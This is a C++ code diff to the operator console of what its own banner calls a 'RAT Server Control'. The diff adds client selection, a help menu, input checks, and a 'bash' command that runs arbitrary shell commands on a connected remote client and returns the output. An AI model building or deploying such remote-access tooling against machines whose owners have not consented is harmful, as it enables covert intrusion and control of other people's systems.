@@ -67,7 +67,9 @@ std::string ServerCommandController::processLine(const std::string &line) {
     std::istringstream iss(line);
     std::string cmd; iss >> cmd;
     std::string reply;
-    if (cmd == "list") {
+    if (cmd == "help") {
+        return handleHelp();
+    } else if (cmd == "list") {
         return handleList();
     } else if (cmd == "choose") {
         std::string name; iss >> name;
@@ -90,32 +92,126 @@ std::string ServerCommandController::processLine(const std::string &line) {
 }
 
 std::string ServerCommandController::handleList() {
+    if (!manager_) return "Manager not available\n";
     std::string reply;
     auto clients = manager_->listClients();
-    for (auto &c : clients) reply += c + "\n";
+    if (clients.empty()) return "No clients connected\n";
+    reply = "Connected clients:\n";
+    for (auto &c : clients) reply += "  - " + c + "\n";
     return reply;
 }
 
+std::string ServerCommandController::handleHelp() {
+    std::string help;
+    help += "\nAvailable Commands:\n";
+    help += "==================\n";
+    help += "  help                     - Show this help message\n";
+    help += "  list                     - List all connected clients\n";
+    help += "  choose <client>          - Select a client for subsequent commands\n";
+    help += "  kill [client]            - Disconnect client (uses selected if not specified)\n";
+    help += "  bash [client] <command>  - Execute shell command (uses selected if not specified)\n";
+    help += "  showlogs                 - Open log viewer in new terminal\n";
+    help += "  quit                     - Stop server and exit\n";
+    help += "\nWorkflow:\n";
+    help += "  1. list                  - See connected clients\n";
+    help += "  2. choose client1        - Select client1\n";
+    help += "  3. bash ls -la           - Run command on selected client\n";
+    help += "  4. bash pwd              - Another command on same client\n";
+    help += "\nExamples:\n";
+    help += "  bash client1 ls -la      - List files on client1 (explicit)\n";
+    help += "  choose client1           - Select client1\n";
+    help += "  bash pwd                 - Show directory on selected client\n";
+    help += "  kill                     - Disconnect selected client\n";
+    help += "\n";
+    return help;
+}
+
 std::string ServerCommandController::handleChoose(const std::string &name) {
-    return manager_->hasClient(name) ? std::string("Chosen ") + name + "\n" : std::string("No such client\n");
+    if (!manager_) return "Manager not available\n";
+    if (name.empty()) return "Invalid client name\n";
+    if (name.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
+        return "Invalid characters in client name\n";
+    }
+    if (manager_->hasClient(name)) {
+        selectedClient_ = name;
+        return std::string("Selected client: ") + name + "\n";
+    }
+    return std::string("No such client\n");
 }
 
 std::string ServerCommandController::handleKill(const std::string &name) {
-    if (manager_->removeClient(name)) return std::string("Killed ") + name + "\n";
+    if (!manager_) return "Manager not available\n";
+    
+    std::string targetClient = name.empty() ? selectedClient_ : name;
+    
+    if (targetClient.empty()) return "No client specified and no client selected\n";
+    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
+        return "Invalid characters in client name\n";
+    }
+    
+    if (manager_->removeClient(targetClient)) {
+        if (targetClient == selectedClient_) selectedClient_.clear();
+        return std::string("Killed ") + targetClient + "\n";
+    }
     return std::string("No such client\n");
 }
 
 std::string ServerCommandController::handleBash(const std::string &name, const std::string &cmd) {
-    IController *ctrl = nullptr;
-    if (manager_) ctrl = manager_->getController(name);
+    if (!manager_) return "Manager not available\n";
+    
+    std::string targetClient;
+    std::string command;
+    
+    if (name.empty()) {
+        if (selectedClient_.empty()) return "No client specified and no client selected\n";
+        targetClient = selectedClient_;
+        command = cmd;
+    } else if (manager_->hasClient(name)) {
+        targetClient = name;
+        command = cmd;
+    } else {
+        if (selectedClient_.empty()) return "No such client and no client selected\n";
+        targetClient = selectedClient_;
+        command = name + (cmd.empty() ? "" : " " + cmd);
+    }
+    
+    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
+        return "Invalid characters in client name\n";
+    }
+    
+    IController *ctrl = manager_->getController(targetClient);
     if (!ctrl) return std::string("No such client\n");
-    std::string reply = "Sending bash command...\n";
-    nlohmann::json out{ {"cmd", cmd} };
-    ctrl->sendJson(out);
-    std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    
+    if (command.empty()) return "Empty command\n";
+    
+    nlohmann::json out{ {"controller", "bash"}, {"cmd", command} };
+    if (!ctrl->sendJson(out)) {
+        return "Failed to send command\n";
+    }
+    
+    int maxWait = 50;
+    int waited = 0;
     std::string lg;
-    while (manager_->popLog(lg)) reply += lg + "\n";
-    return reply;
+    bool foundResponse = false;
+    std::string output;
+    
+    while (waited < maxWait && !foundResponse) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        while (manager_->popLog(lg)) {
+            try {
+                nlohmann::json j = nlohmann::json::parse(lg);
+                if (j.contains("out") && j["out"].is_string()) {
+                    output = j["out"].get<std::string>();
+                    int ret = j.contains("ret") ? j["ret"].get<int>() : -1;
+                    foundResponse = true;
+                    return "Output:\n" + output + "Exit code: " + std::to_string(ret) + "\n";
+                }
+            } catch (...) {}
+        }
+        waited++;
+    }
+    
+    return "(No response - command may still be running)\n";
 }
 
 std::string ServerCommandController::handleQuit() {
@@ -143,9 +239,22 @@ std::string ServerCommandController::handleShowLogs() {
 
 void ServerCommandController::stdinLoop() {
     std::string line;
-    while (running_ && std::getline(std::cin, line)) {
+    std::cout << "\n=== RAT Server Control ===" << std::endl;
+    std::cout << "Type 'help' for available commands\n" << std::endl;
+    
+    while (running_) {
+        if (!selectedClient_.empty()) {
+            std::cout << "[" << selectedClient_ << "] > " << std::flush;
+        } else {
+            std::cout << "\n> " << std::flush;
+        }
+        if (!std::getline(std::cin, line)) break;
+        if (line.empty()) continue;
+        
         std::string reply = processLine(line);
-        if (!reply.empty()) std::cout << reply << std::flush;
+        if (!reply.empty()) {
+            std::cout << reply << std::flush;
+        }
     }
 }
 
